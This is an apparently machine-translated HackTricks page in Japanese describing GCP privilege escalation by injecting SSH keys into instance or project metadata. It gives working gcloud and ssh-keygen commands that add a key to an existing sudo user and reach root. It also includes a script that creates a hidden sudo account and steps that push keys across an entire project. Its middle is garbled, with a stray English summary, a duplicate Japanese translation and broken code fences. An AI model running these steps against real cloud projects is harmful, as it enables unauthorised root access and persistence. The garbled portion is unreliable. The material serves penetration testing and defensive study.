# GCP - カスタムSSHメタデータの追加

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

## メタデータの変更 <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

**インスタンスのメタデータを変更する権限**を持つ攻撃者は、この権限を持つサービスアカウントに妥協/エスカレーションする可能性があります（これはスコープによって制限される可能性があります）：

### **SSHキーをカスタムメタデータに追加する**

GCP上の**Linux** **システム**は通常、[Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)スクリプトを実行しています。これらの中には、**定期的に**インスタンスのメタデータエンドポイントを**問い合わせて、承認されたSSH公開キーの変更をチェックする**[accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)があります。

**新しい公開**キーが検出されると、それは処理されて**ローカルマシンに追加**されます。キーの形式によっては、**既存のユーザーの** `~/.ssh/authorized_keys` ファイルに追加されるか、**`sudo`権限を持つ新しいユーザーを作成します**。

したがって、サービスアカウントで**カスタムインスタンスメタデータを変更**できる場合、特権アカウントへのSSH権限を**取得することで**ローカルシステム上でrootに**エスカレーション**することができます。**カスタムプロジェクトメタデータを変更**できる場合、accounts daemonを実行している現在のGCPプロジェクト内の**任意のシステム**でrootに**エスカレーション**することができます。

### **既存の特権ユーザーにSSHキーを追加する**

まず、既存のアカウントに自分のキーを追加することから始めましょう。これがおそらく最も少ない騒音を立てるでしょう。

**インスタンスで既存のSSHキーをチェック**します。これらのユーザーの1つを選びます。彼らはsudo権限を持っている可能性が高いです。
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
```markdown
# GCP Compute Privilege Escalation via Custom SSH Metadata

## Overview

In GCP, instances can have custom metadata that can be used to manage SSH keys. If you have the permission to edit an instance's metadata, you can add your own SSH key and gain access to that instance.

## Prerequisites

- You must have the `compute.instances.setMetadata` permission on the target instance.
- You must have an SSH key pair.

## Steps

1. Generate an SSH key pair if you do not have one.
2. Access the GCP console and navigate to the target instance.
3. Edit the instance's metadata.
4. Add your SSH public key to the instance's metadata.
5. SSH into the instance using your private key.

## Considerations

- Ensure that the SSH key is in the correct format for GCP.
- Be aware that your activities may be logged and could trigger security alerts.
```

# GCP Compute Privilege Escalation via Custom SSH Metadata

## 概要

GCPでは、インスタンスにはSSHキーを管理するために使用できるカスタムメタデータがあります。インスタンスのメタデータを編集する権限がある場合、自分のSSHキーを追加してそのインスタンスへのアクセスを取得できます。

## 前提条件

- 対象インスタンスに`compute.instances.setMetadata`権限が必要です。
- SSHキーペアを持っている必要があります。

## 手順

1. SSHキーペアを持っていない場合は、生成してください。
2. GCPコンソールにアクセスし、対象インスタンスに移動します。
3. インスタンスのメタデータを編集します。
4. SSH公開キーをインスタンスのメタデータに追加します。
5. 私有キーを使用してインスタンスにSSHで接続します。

## 考慮事項

- SSHキーがGCPの正しい形式であることを確認してください。
- 活動がログに記録され、セキュリティアラートを引き起こす可能性があることに注意してください。
```
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
以下の公開鍵の**やや奇妙な形式**に注意してください - **ユーザー名**が**先頭**に記載されています（コロンに続いて）そして再び**最後**に。この形式に合わせる必要があります。通常のSSHキー操作とは異なり、ユーザー名は絶対に重要です！

**ユーザー名とキーを含む行を新しいテキスト**ファイル`meta.txt`に保存します。

上記のユーザー`alice`をターゲットにすると仮定しましょう。次のように自分用の**新しいキーを生成**します：
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
ファイル `meta.txt` に新しい公開鍵を以下の形式で追加します：
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
Now, you can **SSHキーメタデータを書き換える** 以下のコマンドでインスタンスに対して:
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
以下のようにして、`alice`のコンテキストで**シェルにアクセス**できます：
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **新しい特権ユーザーを作成し、SSHキーを追加する**

上記の手順に従っても既存のキーが見つからない場合、または`/etc/passwd`でターゲットにする他の興味深いユーザーがいない場合はどうでしょうか？

**同じプロセスに従って**、ただ**新しいユーザー名を作ります**。このユーザーは自動的に作成され、`sudo`の権利が与えられます。スクリプト化されたプロセスは以下のようになります：
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### プロジェクトレベルでのSSHキー <a href="#sshing-around" id="sshing-around"></a>

前のセクションで述べた詳細に従って、さらに多くのVMを侵害しようとすることができます。

これらに少し詳しく触れることで、["Block project-wide SSH keys" オプションを明示的に選択していない任意のインスタンスに対して、**特権アカウントへのSSHアクセス**を許可する、[**プロジェクトレベルでのSSHキーの適用**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide)が可能になります。
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
大胆な場合は、`gcloud compute ssh [INSTANCE]` を入力して、他のボックスで現在のユーザー名を使用することもできます。

# 参考文献
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFT**](https://opensea.io/collection/the-peass-family) コレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォロー** してください。
* **HackTricks** の GitHub リポジトリ [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) に PR を提出して、あなたのハッキングのコツを共有してください。

</details>
